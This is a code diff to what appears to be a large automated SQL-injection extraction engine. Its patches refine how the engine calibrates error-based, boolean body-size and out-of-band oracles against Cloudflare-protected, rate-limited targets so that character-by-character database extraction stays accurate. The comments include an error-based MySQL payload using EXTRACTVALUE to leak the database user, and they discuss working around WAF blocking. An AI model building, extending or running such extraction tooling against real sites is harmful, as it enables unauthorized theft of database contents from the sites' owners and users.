@@ -144070,6 +144070,23 @@ class MultiStrategyExtractor:
                         "date", "age", "cf-ray",
                     })
                     _err_status_is_waf = (_es is not None and _es in _MSE_WAF_PROBE_CODES)
+                    # BUG-ERROR-ORACLE-429-CAL-FIX (CRITICAL, Cloudflare/rate-limited targets):
+                    # When BOTH error and ok calibration probes return 429 (rate-limited),
+                    # the only observable diff is body SIZE — which is Cloudflare page size
+                    # variation driven by URL-length (not SQL truth/error). Registering a
+                    # "size" diff oracle in this scenario means every extraction probe's
+                    # 429 page size is compared to the calibrated err_len/ok_len, and the
+                    # verdict is URL-echo noise. This produces the same garbage extraction
+                    # as the bool_body_diff 429 calibration bug.
+                    # Fix: if both probes are 429 AND the diff is purely size or body
+                    # (not a stable header or different status), skip this error method.
+                    _both_429 = (_es == 429 and _os == 429)
+                    if _both_429 and _diff_type in ("size", "body") and not _hdr_diff:
+                        print(f"[MSE]   err({_name}): both err/ok probes returned 429 — "
+                              f"size diff is CDN URL-echo noise, not SQL error signal — skipping",
+                              flush=True)
+                        await asyncio.sleep(0.2)
+                        continue
                     if _diff_type == "status" and _err_status_is_waf:
                         if _hdr_diff and _hdr_diff_key and _hdr_diff_key.lower() not in _MSE_DYNAMIC_HDR:
                             # Stable header detected — override to header diff type so
@@ -144212,6 +144229,19 @@ class MultiStrategyExtractor:
             # carry a different header value from the DB-level error page, which is
             # exactly what the header oracle detects. Skipping on status would discard
             # all True-condition probes → _votes=[] → None → extraction timeout.
+            # BUG-ERROR-EVAL-429-BOTH-CAL-FIX (CRITICAL, Cloudflare/rate-limited targets):
+            # When the error oracle was calibrated with BOTH err_status and ok_status being
+            # 429 (should have been skipped by _probe_error fix, but defence-in-depth here):
+            # every extraction probe also returns 429, and the diff=size comparison measures
+            # CDN page size variation (URL-echo noise), not SQL error vs. ok.  The guard
+            # `_fp_status != _ok_status_cal` prevents the general WAF guard from firing
+            # (429 == 429 = False).  Explicitly reject when both calibration statuses and
+            # the probe status are all 429 AND oracle is size-based (not header-based).
+            if (_fp_status == 429
+                    and _err_status_cal == 429
+                    and _ok_status_cal == 429
+                    and not _using_stable_hdr_eval):
+                continue  # 429/429 calibrated size oracle — URL-echo noise, not SQL signal
             if not _using_stable_hdr_eval:
                 if (_fp_status in _waf_block_statuses
                         and (_fp_status != _err_status_cal or _err_status_cal in _waf_block_statuses)
@@ -144587,7 +144617,10 @@ class MultiStrategyExtractor:
             try:
                 fp, _ = await self._timed(_p)
                 _st = getattr(fp, "status_code", None)
-                _ok = fp is not None and _st is not None and _st < 500
+                # BUG-OOB-PROBE-429-FIX: 429 means rate-limited — request was blocked
+                # before reaching the DB, so the OOB write did not execute. Accepting 429
+                # as "ok" would register an OOB method that silently fails every extraction.
+                _ok = fp is not None and _st is not None and _st < 500 and _st != 429
                 print(f"[MSE]   oob({_name}): status={_st}", flush=True)
                 if _ok:
                     self._oob_method = _name
@@ -144970,7 +145003,14 @@ class MultiStrategyExtractor:
             _bbd_skip_always_error = False
             _bbd_det_technique = getattr(self.det, 'technique', '') or ''
             if _bbd_det_technique in ('E', 'EH'):
-                _bbd_tmpl_str = (getattr(self, '_det_tmpl', '') or '').upper()
+                # BUG-BBD-SKIP-ALWAYS-ERROR-PAYLOAD-FIX (CRITICAL, MySQL/MariaDB EXTRACTVALUE targets):
+                # _det_tmpl is empty string for E/EH error-based injections — _build_det_template
+                # returns '' when no replaceable boolean condition is found (e.g. EXTRACTVALUE(0x0a,...)).
+                # The original check therefore never found 'EXTRACTVALUE' in the empty string,
+                # so _bbd_skip_always_error stayed False and calibration ran on EXTRACTVALUE targets.
+                # Fix: include _det_payload in the marker search so the detection payload
+                # (e.g. "AND EXTRACTVALUE(0x0a,CONCAT(0x7e,USER()))") is checked directly.
+                _bbd_tmpl_str = ((getattr(self, '_det_tmpl', '') or '') + (getattr(self, '_det_payload', '') or '')).upper()
                 # These functions raise unconditional DB errors; their presence in the template
                 # means the boolean condition appended by _build_inline is irrelevant.
                 _always_error_markers = (
@@ -145036,6 +145076,21 @@ class MultiStrategyExtractor:
                 _bbd_fp_t, _ = await self._timed(self._build_inline(f"({_bbd_true_cond}) AND 1=1"))
                 await asyncio.sleep(0.3)
                 _bbd_fp_f, _ = await self._timed(self._build_inline(f"({_bbd_false_cond}) AND 1=1"))
+                # BUG-BBD-CAL-429-FIX (CRITICAL, Cloudflare/rate-limited targets):
+                # When both calibration probes return HTTP 429 (rate-limited), the
+                # "gap" we measure is Cloudflare 429 page size variation driven by
+                # URL-length differences (request parameters differ → different URL →
+                # CDN echo page slightly larger/smaller). This is NOT SQL truth.
+                # During extraction, the comparison string prefix+chr(mid+1) hex-encodes
+                # into the URL; longer hex → slightly larger 429 page → oracle returns
+                # True → binary search converges to U+FFFF garbage.
+                # Fix: if both probes are 429, skip bool_body_diff entirely.
+                _bbd_sc_t = _get_safe_status_code(_bbd_fp_t) if _bbd_fp_t else 0
+                _bbd_sc_f = _get_safe_status_code(_bbd_fp_f) if _bbd_fp_f else 0
+                if _bbd_sc_t == 429 and _bbd_sc_f == 429:
+                    LOG.warning("[MSE] Skipping bool_body_diff oracle: both calibration probes "
+                                "returned 429 (rate-limited) — gap measures CDN page size, not SQL truth")
+                    raise ValueError("_bbd_skip_rate_limited")
                 _bbd_body_t = len(getattr(_bbd_fp_t, 'body', b'') or b'') if _bbd_fp_t else 0
                 _bbd_body_f = len(getattr(_bbd_fp_f, 'body', b'') or b'') if _bbd_fp_f else 0
                 _bbd_gap = abs(_bbd_body_t - _bbd_body_f)
@@ -145107,6 +145162,19 @@ class MultiStrategyExtractor:
                         # ARRAY_LOWER/LN validation conditions — the status check here
                         # provides a safety net for any WAF-blocked extraction probe.
                         _sc2 = _get_safe_status_code(_fp_t2)
+                        # BUG-EBBD-429-RATE-LIMIT-FIX (CRITICAL, Cloudflare/CDN targets):
+                        # HTTP 429 = rate-limit page. Cloudflare 429 pages echo the
+                        # request URI, so their body size varies with URL length — not
+                        # with SQL truth. Accepting any 429 response as a valid oracle
+                        # signal causes binary search to converge on character code point
+                        # determined by URL length (typically U+FFFF or similar garbage).
+                        # This check is intentionally stricter than the WAF_BLOCK_CODES
+                        # check below: 429 is unconditionally rejected regardless of body
+                        # size proximity to calibration range, because even when probe
+                        # sizes happen to be near the calibrated values the truth signal
+                        # is CDN URL echo noise, not SQL evaluation result.
+                        if _sc2 == 429:
+                            return None  # rate-limited — body reflects CDN page, not SQL
                         if _sc2 in WAFBlockDiscriminator.WAF_BLOCK_CODES:
                             _cal_min = min(_cal_true, _cal_false)
                             _cal_max = max(_cal_true, _cal_false)
@@ -145241,18 +145309,33 @@ class MultiStrategyExtractor:
                 await asyncio.sleep(0.2)
                 r2 = await asyncio.wait_for(_fn(_mse_val_false), timeout=20)
                 if r1 is None and r2 is None:
-                    # WAF/CDN blocked both validation probes — result is indeterminate.
-                    # The oracle was confirmed during calibration; accept it rather than
-                    # discarding because the exotic validation conditions were blocked.
-                    LOG.info("[MSE]  %s validation indeterminate (WAF blocked both probes) — "
-                             "accepting oracle (calibrated at probe time)", name)
-                    _validated.append(name)
-                    continue
+                    # BUG-MSE-VAL-NONE-NONE-FIX (HIGH, Cloudflare/rate-limited targets):
+                    # The original code accepted the oracle when BOTH round-1 validation
+                    # probes returned None, under the assumption that "WAF blocked the
+                    # exotic validation SQL — the oracle must be fine because it was
+                    # calibrated." This is incorrect when the target is rate-limiting
+                    # ALL requests (429 responses from CDN). Fix 3 (_eval_bool_body_diff
+                    # returning None for 429 probes) makes every probe return None during
+                    # rate-limiting. The old code then accepted the oracle as "indeterminate
+                    # but valid" — allowing extraction to proceed with an oracle that returns
+                    # None for EVERY condition, causing eval_condition to backoff and return
+                    # False for every position → extraction loops or returns empty string.
+                    # Fix: fall through to Round 2 which uses DBMS-specific metadata
+                    # conditions. Round 2's own r3=None/r4=None check (line ~145460)
+                    # correctly drops the oracle with "cannot evaluate any condition."
+                    # This is the right outcome when the oracle is fully blocked by rate-limiting.
+                    print(f"[MSE]  {name} round-1 both-None (WAF/rate-limit) — "
+                          f"falling through to round-2 real-condition verification", flush=True)
+                    # fall through to Round 2 — skip round-1 classification entirely
+                    # (_r1_all_none=True prevents the else-drop below from firing)
                 # Classify round-1 result and decide whether/how to proceed to Round 2.
+                _r1_all_none = (r1 is None and r2 is None)  # BUG-MSE-VAL-NONE-NONE-FIX: skip else-drop
                 _r1_uniform = (r1 is not None and r2 is not None and r1 == r2)
                 _r1_pass    = bool(r1 and not r2)
                 _r1_invert  = bool(not r1 and r2)
-                if _r1_uniform:
+                if _r1_all_none:
+                    pass  # round-1 indeterminate — proceed directly to round-2 verification
+                elif _r1_uniform:
                     # BUG-MSE-VAL-UNIFORM-CORRECT-FIX (CRITICAL, all DBMSes, all WAF types):
                     # When both r1 and r2 return the SAME non-None value (both False or
                     # both True), the WAF returns a uniform response for all exotic
